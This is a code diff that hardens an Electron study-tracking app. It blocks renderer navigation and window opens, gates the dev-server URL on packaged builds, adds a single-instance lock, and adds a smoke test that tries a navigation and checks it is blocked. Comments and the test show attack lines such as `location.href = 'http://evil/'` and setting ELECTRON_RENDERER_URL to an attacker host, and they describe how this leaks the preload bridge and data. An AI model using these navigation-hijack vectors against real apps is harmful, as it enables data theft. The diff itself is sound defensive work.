@@ -72,12 +72,56 @@ function createWindow(bindings: AppBindings): BrowserWindow {
     },
   });
 
-  if (process.env['ELECTRON_RENDERER_URL'] !== undefined) {
-    void win.loadURL(process.env['ELECTRON_RENDERER_URL']);
+  // Gated on isPackaged: without it, `set ELECTRON_RENDERER_URL=http://attacker/`
+  // makes an attacker's page BE the app window, holding the preload bridge and
+  // with no CSP. The dev server is a development affordance and has no business
+  // in a shipped binary.
+  const devUrl = app.isPackaged ? undefined : process.env['ELECTRON_RENDERER_URL'];
+  if (devUrl !== undefined) {
+    void win.loadURL(devUrl);
   } else {
     void win.loadFile(join(outRoot, 'renderer', 'index.html'));
   }
   return win;
+}
+
+/**
+ * THE RENDERER MAY NEVER LEAVE ITS OWN DOCUMENT.
+ *
+ * Without this, one line of injected script — `location.href = 'http://evil/'` —
+ * navigates the window to an attacker-controlled origin that still holds the
+ * full preload bridge, and the meta CSP does NOT follow: it died with the local
+ * document. An independent review demonstrated exactly this inside the real
+ * built app, reading the entire study history from a remote page and
+ * exfiltrating it.
+ *
+ * The precondition is script execution in the renderer, which is not exotic for
+ * an app whose roadmap adds seven views plus an in-app notepad and editor
+ * (masterplan §7, Phase 7), and which bundles third-party dependencies.
+ *
+ * Note `window.open` was verified NOT to inherit the bridge in this
+ * configuration — the child gets `undefined`. `will-navigate` is the real
+ * vector, and denying window opens is defence in depth rather than the fix.
+ */
+function hardenNavigation(): void {
+  app.on('web-contents-created', (_event, contents) => {
+    contents.on('will-navigate', (event, url) => {
+      const current = contents.getURL();
+      // Same-document navigation only. Anything else — including the dev server
+      // reloading itself — must be an explicit load from this process.
+      if (url !== current) {
+        event.preventDefault();
+        console.warn(`[nerdyapp] blocked navigation to ${url}`);
+      }
+    });
+    contents.setWindowOpenHandler(({ url }) => {
+      console.warn(`[nerdyapp] blocked window.open to ${url}`);
+      return { action: 'deny' };
+    });
+    contents.on('will-attach-webview', (event) => {
+      event.preventDefault();
+    });
+  });
 }
 
 /**
@@ -156,6 +200,35 @@ async function runSmokeFlow(win: BrowserWindow): Promise<boolean> {
   check('the session appears in history', after.includes(name), after);
   check('no session is running afterwards', after.includes('No session running.'), after);
 
+  // The interruption count, read back through the Details expansion. Asserting
+  // only "no Error appeared" left the Distracted button free to record nothing:
+  // replacing the handler with `() => Promise.resolve()` kept every unit test,
+  // both smokes, typecheck and lint green. This is the Phase 2 R3 signal, so it
+  // needs a check that can see it.
+  await js(
+    `document.querySelectorAll('[data-testid="history-row"] button')[0].click()`,
+  );
+  await settle();
+  const detail = await text();
+  check(
+    'the pause and the distraction were both recorded',
+    detail.includes('2 interruption(s)'),
+    detail,
+  );
+
+  // THE SECURITY CHECK. Without a will-navigate handler, one line of injected
+  // script carries the preload bridge to an attacker-controlled origin, where
+  // the meta CSP no longer applies — an independent review demonstrated exactly
+  // that inside this app, reading the whole study history from a remote page.
+  const before = (await js('location.href')) as string;
+  await js(`try { location.href = 'http://127.0.0.1:9/'; } catch (e) {}`);
+  await wait(400);
+  check(
+    'the renderer cannot navigate away from its own document',
+    ((await js('location.href')) as string) === before,
+    (await js('location.href')) as string,
+  );
+
   console.log('=== RENDERER DOM ===');
   console.log((await text()).trim());
   for (const f of failures) console.log(`  ! ${f}`);
@@ -164,6 +237,31 @@ async function runSmokeFlow(win: BrowserWindow): Promise<boolean> {
 
 export function start(bindings: AppBindings): void {
   outRoot = bindings.outRoot;
+
+  // A SECOND instance must never open the same database.
+  //
+  // createSqliteBinding runs recoverCrashedSessions() at open, and recovery
+  // cannot distinguish a live session from a crashed one — "unterminated" is
+  // the only signal schema v1 carries. So launching the app again mid-session
+  // closes the session the user is sitting in front of, as `crashed`, at its
+  // last pause watermark. A crashed session can never be surveyed, so a real
+  // 90-minute study block becomes unratable and cannot weight the day — and
+  // the first window keeps ticking, giving no sign anything went wrong.
+  //
+  // Only the database-backed build needs this. The test build opens no file,
+  // and the smoke runs against a throwaway directory.
+  if (bindings.usesDatabase && !isSmoke && !app.requestSingleInstanceLock()) {
+    app.quit();
+    return;
+  }
+  hardenNavigation();
+
+  app.on('second-instance', () => {
+    const [win] = BrowserWindow.getAllWindows();
+    if (win === undefined) return;
+    if (win.isMinimized()) win.restore();
+    win.focus();
+  });
   void app.whenReady().then(async () => {
     // Opened BEFORE the window. For the product this is where the database is
     // created and crash recovery runs; a window that could start a session
